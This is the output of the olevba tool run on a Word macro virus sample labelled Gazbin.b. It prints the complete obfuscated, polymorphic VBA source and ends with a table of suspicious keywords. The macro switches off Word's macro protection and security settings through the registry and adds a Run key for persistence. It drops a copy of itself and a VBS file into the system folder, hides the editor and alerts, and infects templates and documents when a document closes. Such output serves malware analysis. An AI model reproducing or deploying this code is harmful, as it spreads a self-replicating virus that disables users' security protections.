olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Gazbin.b-eec4e1939e4de174fa7d04aa90c1fb1911dfafdda30882d4f9368a62632a2a83
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Gazbin.b-eec4e1939e4de174fa7d04aa90c1fb1911dfafdda30882d4f9368a62632a2a83 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Gazbin.b-eec4e1939e4de174fa7d04aa90c1fb1911dfafdda30882d4f9368a62632a2a83 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub ¨–È™¤É°ž˜­ª¥±É¯ƒ() 'IK
¨–È™¤É°ž˜­ª¥±É¯ƒ_VisB = "Vi" & "su" & "al" & " Ba" & "sic"
¨–È™¤É°ž˜­ª¥±É¯ƒ_CuZt = "Cu" & "st" & "om" & "ize" & "..."
¨–È™¤É°ž˜­ª¥±É¯ƒ_TooL = "To" & "ol" & "s"
¨–È™¤É°ž˜­ª¥±É¯ƒ_MaCr = "Ma" & "cr" & "o"
¨–È™¤É°ž˜­ª¥±É¯ƒ_Name = "Ga" & "zB" & "in"
¨–È™¤É°ž˜­ª¥±É¯ƒ_97 = "HK" & "EY_" & "CUR" & "REN" & "T_U" & "SER" & "\S" & "of" & "twa" & "re\" & "Mic" & "ros" & "oft" & "\Of" & "fic" & "e\8" & ".0" & "\W" & "ord" & "\Op" & "ti" & "ons"
¨–È™¤É°ž˜­ª¥±É¯ƒ_Reg = "HK" & "EY_" & "CUR" & "REN" & "T_U" & "SER" & "\S" & "of" & "twa" & "re\" & "Mic" & "ros" & "oft" & "\Of" & "fic" & "e\9" & ".0\" & "Wor" & "d\" & "Sec" & "uri" & "ty"
¨–È™¤É°ž˜­ª¥±É¯ƒ_XP = "HK" & "EY_" & "CUR" & "REN" & "T_U" & "SER" & "\S" & "of" & "twa" & "re\" & "Mic" & "ros" & "oft" & "\Of" & "fic" & "e\10" & ".0\" & "Wor" & "d\" & "Sec" & "uri" & "ty"
¨–È™¤É°ž˜­ª¥±É¯ƒ_run = "HK" & "EY_" & "CUR" & "REN" & "T_U" & "SER" & "\S" & "of" & "twa" & "re\" & "Mic" & "ros" & "oft\" & "Wi" & "nd" & "ows" & "\Cu" & "rren" & "tVer" & "si" & "on\" & "Run"
¨–È™¤É°ž˜­ª¥±É¯ƒ_ACVB = "Ac" & "ces" & "sVB" & "OM"
¨–È™¤É°ž˜­ª¥±É¯ƒ_LVL = "Le" & "v" & "el"
¨–È™¤É°ž˜­ª¥±É¯ƒ_EMVP = "En" & "abl" & "eMac" & "roVir" & "usPro" & "tect" & "ion"
¨–È™¤É°ž˜­ª¥±É¯ƒ_Sys = Environ("Wi" & "nd" & "ir") & "\s" & "ys" & "tem" & "\Ga" & "zbi" & "n.s" & "ys"
¨–È™¤É°ž˜­ª¥±É¯ƒ_vbs = Environ("Wi" & "nd" & "ir") & "\s" & "ys" & "tem" & "\Ga" & "zbi" & "n.v" & "bs"
¨–È™¤É°ž˜­ª¥±É¯ƒ_Chk = "Pri" & "vat" & "e S" & "ub " & "¨–È™¤É°ž˜­ª¥±É¯ƒ" & "() " & "'I" & "K"
¨–È™¤É°ž˜­ª¥±É¯ƒ_One = ((VBA.Tan(VBA.Rnd * ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null) + VBA.Fix(VBA.Rnd * ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null)) * ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null) + VBA.Fix(¨–È™¤É°ž˜­ª¥±É¯ƒ_Null + 1)
¨–È™¤É°ž˜­ª¥±É¯ƒ_Null = (VBA.Sin(VBA.Rnd * False) + VBA.Tan(VBA.Rnd * False)) * False
¨–È™¤É°ž˜­ª¥±É¯ƒ_Two = ((VBA.Sin(VBA.Rnd * ¨–È™¤É°ž˜­ª¥±É¯ƒ_One) + VBA.Cos(VBA.Rnd * ¨–È™¤É°ž˜­ª¥±É¯ƒ_One)) * ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null) + VBA.Fix(¨–È™¤É°ž˜­ª¥±É¯ƒ_One + ¨–È™¤É°ž˜­ª¥±É¯ƒ_One)
¨–È™¤É°ž˜­ª¥±É¯ƒ_Hone = &H1
¨–È™¤É°ž˜­ª¥±É¯ƒ_HNul = &H0
¨–È™¤É°ž˜­ª¥±É¯ƒ_KF11 = wdKeyF11
¨–È™¤É°ž˜­ª¥±É¯ƒ_KAlt = wdKeyAlt
¨–È™¤É°ž˜­ª¥±É¯ƒ_KF8 = wdKeyF8
¨–È™¤É°ž˜­ª¥±É¯ƒ_NCV = msoBarNoChangeVisible
¨–È™¤É°ž˜­ª¥±É¯ƒ_NCZ = msoBarNoCustomize
¨–È™¤É°ž˜­ª¥±É¯ƒ_WDA = wdAlertsNone
¨–È™¤É°ž˜­ª¥±É¯ƒ_ECK = wdCancelDisabled
¨–È™¤É°ž˜­ª¥±É¯ƒ_code = ThisDocument.VBProject.VBComponents(¨–È™¤É°ž˜­ª¥±É¯ƒ_One).CodeModule.Lines(¨–È™¤É°ž˜­ª¥±É¯ƒ_One, ¨–È™¤É°ž˜­ª¥±É¯ƒ_One & ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null & ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null & ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null)
Randomize Timer

For ¨–È™¤É°ž˜­ª¥±É¯ƒ_I = 1 To 10 + VBA.Int(VBA.Rnd * 30)
¨–È™¤É°ž˜­ª¥±É¯ƒ_NewVar = ¨–È™¤É°ž˜­ª¥±É¯ƒ_NewVar & Chr(VBA.Int(VBA.Rnd * 75) + VBA.Int(129))
Next

Do While InStr(¨–È™¤É°ž˜­ª¥±É¯ƒ_code, "¨–È™¤É°ž˜­ª¥±É¯ƒ") <> 0
¨–È™¤É°ž˜­ª¥±É¯ƒ_code = Mid(¨–È™¤É°ž˜­ª¥±É¯ƒ_code, 1, InStr(¨–È™¤É°ž˜­ª¥±É¯ƒ_code, "¨–È™¤É°ž˜­ª¥±É¯ƒ") - 1) & ¨–È™¤É°ž˜­ª¥±É¯ƒ_NewVar & Mid(¨–È™¤É°ž˜­ª¥±É¯ƒ_code, InStr(¨–È™¤É°ž˜­ª¥±É¯ƒ_code, "¨–È™¤É°ž˜­ª¥±É¯ƒ") + Len("¨–È™¤É°ž˜­ª¥±É¯ƒ"))
Loop

Set ¨–È™¤É°ž˜­ª¥±É¯ƒ_Adoc = ActiveDocument
Set ¨–È™¤É°ž˜­ª¥±É¯ƒ_Norm = NormalTemplate
Set ¨–È™¤É°ž˜­ª¥±É¯ƒ_Mcon = MacroContainer
Set ¨–È™¤É°ž˜­ª¥±É¯ƒ_syst = System
Set ¨–È™¤É°ž˜­ª¥±É¯ƒ_CVB = CommandBars(¨–È™¤É°ž˜­ª¥±É¯ƒ_VisB)
Set ¨–È™¤É°ž˜­ª¥±É¯ƒ_CTL = CommandBars(¨–È™¤É°ž˜­ª¥±É¯ƒ_TooL)
Set ¨–È™¤É°ž˜­ª¥±É¯ƒ_Opt = Options
Set ¨–È™¤É°ž˜­ª¥±É¯ƒ_App = Application

Open ¨–È™¤É°ž˜­ª¥±É¯ƒ_Sys For Output As #1
Print #1, ¨–È™¤É°ž˜­ª¥±É¯ƒ_code
Close #1

Open ¨–È™¤É°ž˜­ª¥±É¯ƒ_vbs For Output As #1
Print #1, "O" & "n " & "erro" & "r re" & "sume ne" & "xt"
Print #1, "¨–È™¤É°ž˜­ª¥±É¯ƒ_Nu" & "ll =" & " (Si" & "n(R" & "nd *" & " Fal" & "se)" & " + " & "vba.tan" & "(Rn" & "d *" & " F" & "al" & "se)" & ") * " & "F" & "alse"
Print #1, "¨–È™¤É°ž˜­ª¥±É¯ƒ_One = ((" & "vba.tan(" & "vba.Rnd " & "* ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null) + Fi" & "x(R" & "nd * ¨–È™¤É°ž˜­ª¥±É¯ƒ_" & "N" & "ull)) * ¨–È™¤É°ž˜­ª¥±É¯ƒ_N" & "ull) + Fi" & "x(¨–È™¤É°ž˜­ª¥±É¯ƒ_" & "Nul" & "l +" & " 1)"
Print #1, "Set" & " wrd" & " = Cr" & "eate" & "oBject(" & Chr(34) & "Wo" & "rd.Ap" & "plic" & "ation" & Chr(34) & ")"
Print #1, "with" & " wrd" & ".nor" & "malt" & "emp" & "lat" & "e.v" & "bpr" & "ojec" & "t.vb" & "com" & "pon" & "ents" & "(¨–È™¤É°ž˜­ª¥±É¯ƒ" & "_On" & "e).c" & "odem" & "odule"
Print #1, "¨–È™¤É°ž˜­ª¥±É¯ƒ_All" & "Lines =" & " .Coun" & "tOfL" & "ines"
Print #1, ".Del" & "etel" & "ines " & "¨–È™¤É°ž˜­ª¥±É¯ƒ_One" & ", ¨–È™¤É°ž˜­ª¥±É¯ƒ_Al" & "lLines"
Print #1, ".A" & "ddfr" & "omfi" & "le " & Chr(34) & ¨–È™¤É°ž˜­ª¥±É¯ƒ_Sys & Chr(34)
Print #1, "en" & "d wi" & "th"
Print #1, "wr" & "d.Qu" & "it"
Close #1

With ¨–È™¤É°ž˜­ª¥±É¯ƒ_syst
.PrivateProfileString("", ¨–È™¤É°ž˜­ª¥±É¯ƒ_97, ¨–È™¤É°ž˜­ª¥±É¯ƒ_EMVP) = ¨–È™¤É°ž˜­ª¥±É¯ƒ_HNul
.PrivateProfileString("", ¨–È™¤É°ž˜­ª¥±É¯ƒ_Reg, ¨–È™¤É°ž˜­ª¥±É¯ƒ_LVL) = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Hone
.PrivateProfileString("", ¨–È™¤É°ž˜­ª¥±É¯ƒ_XP, ¨–È™¤É°ž˜­ª¥±É¯ƒ_LVL) = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Hone
.PrivateProfileString("", ¨–È™¤É°ž˜­ª¥±É¯ƒ_XP, ¨–È™¤É°ž˜­ª¥±É¯ƒ_ACVB) = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Hone
.PrivateProfileString("", ¨–È™¤É°ž˜­ª¥±É¯ƒ_run, ¨–È™¤É°ž˜­ª¥±É¯ƒ_Name) = ¨–È™¤É°ž˜­ª¥±É¯ƒ_vbs
End With

With ¨–È™¤É°ž˜­ª¥±É¯ƒ_CVB
.Visible = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null
.Enabled = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null
.Protection = ¨–È™¤É°ž˜­ª¥±É¯ƒ_NCV
.Protection = ¨–È™¤É°ž˜­ª¥±É¯ƒ_NCZ
End With

With ¨–È™¤É°ž˜­ª¥±É¯ƒ_CTL
.Controls(¨–È™¤É°ž˜­ª¥±É¯ƒ_MaCr).Enabled = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null
.Controls(¨–È™¤É°ž˜­ª¥±É¯ƒ_CuZt).Enabled = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null
End With

With ¨–È™¤É°ž˜­ª¥±É¯ƒ_Opt
.SaveNormalPrompt = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null
.ConfirmConversions = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null
End With

With ¨–È™¤É°ž˜­ª¥±É¯ƒ_App
.DisplayAlerts = ¨–È™¤É°ž˜­ª¥±É¯ƒ_WDA
.ScreenUpdating = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null
.DisplayStatusBar = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null
.EnableCancelKey = ¨–È™¤É°ž˜­ª¥±É¯ƒ_ECK
.ShowVisualBasicEditor = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null
End With

FindKey(BuildKeyCode(¨–È™¤É°ž˜­ª¥±É¯ƒ_KF11, ¨–È™¤É°ž˜­ª¥±É¯ƒ_KAlt)).Disable
FindKey(BuildKeyCode(¨–È™¤É°ž˜­ª¥±É¯ƒ_KF8, ¨–È™¤É°ž˜­ª¥±É¯ƒ_KAlt)).Disable

If ¨–È™¤É°ž˜­ª¥±É¯ƒ_Mcon = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Adoc Then Set ¨–È™¤É°ž˜­ª¥±É¯ƒ_Target = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Norm
If ¨–È™¤É°ž˜­ª¥±É¯ƒ_Mcon = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Norm Then Set ¨–È™¤É°ž˜­ª¥±É¯ƒ_Target = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Adoc

If ¨–È™¤É°ž˜­ª¥±É¯ƒ_Target = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Adoc Then ¨–È™¤É°ž˜­ª¥±É¯ƒ_Target.ReadOnlyRecommended = ¨–È™¤É°ž˜­ª¥±É¯ƒ_Null

With ¨–È™¤É°ž˜­ª¥±É¯ƒ_Target.VBProject.VBComponents(¨–È™¤É°ž˜­ª¥±É¯ƒ_One).CodeModule
¨–È™¤É°ž˜­ª¥±É¯ƒ_AllLines = .CodePane.CodeModule.CountOfLines
If .CodePane.CodeModule.Lines(¨–È™¤É°ž˜­ª¥±É¯ƒ_One, ¨–È™¤É°ž˜­ª¥±É¯ƒ_One) <> ¨–È™¤É°ž˜­ª¥±É¯ƒ_Chk Then
.CodePane.CodeModule.DeleteLines ¨–È™¤É°ž˜­ª¥±É¯ƒ_One, ¨–È™¤É°ž˜­ª¥±É¯ƒ_AllLines
.CodePane.CodeModule.InsertLines ¨–È™¤É°ž˜­ª¥±É¯ƒ_One, ¨–È™¤É°ž˜­ª¥±É¯ƒ_code
End If
End With

End Sub
Private Sub Document_Close()
Call ¨–È™¤É°ž˜­ª¥±É¯ƒ
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |t.vb                |Executable file name                         |
|Base64    |z{l                 |ents                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

